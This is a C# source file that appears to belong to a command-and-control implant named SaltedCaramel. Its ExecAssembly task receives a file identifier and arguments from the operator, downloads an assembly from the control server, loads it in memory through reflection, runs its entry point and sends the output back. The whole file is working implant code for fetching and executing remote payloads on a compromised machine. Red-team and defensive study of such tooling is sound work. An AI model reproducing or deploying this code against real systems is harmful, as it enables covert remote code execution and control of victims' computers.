using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using Reflection = System.Reflection;
using SaltedCaramel.Jobs;

namespace SaltedCaramel.Tasks
{
    class ExecAssembly
    {
        public static void Execute(Job job, SCImplant implant)
        {
            SCTask task = job.Task;
            JObject json = (JObject)JsonConvert.DeserializeObject(task.@params);
            string file_id = json.Value<string>("file_id");
            string[] args = json.Value<string[]>("args");
            byte[] assemblyBytes = Upload.GetFile(file_id, implant);
            Reflection.Assembly assembly = Reflection.Assembly.Load(assemblyBytes);
            string result = assembly.EntryPoint.Invoke(null, args).ToString();

            implant.TryPostResponse(new SCTaskResp(task.id, result));
            implant.TrySendComplete(job);
        }
    }
}
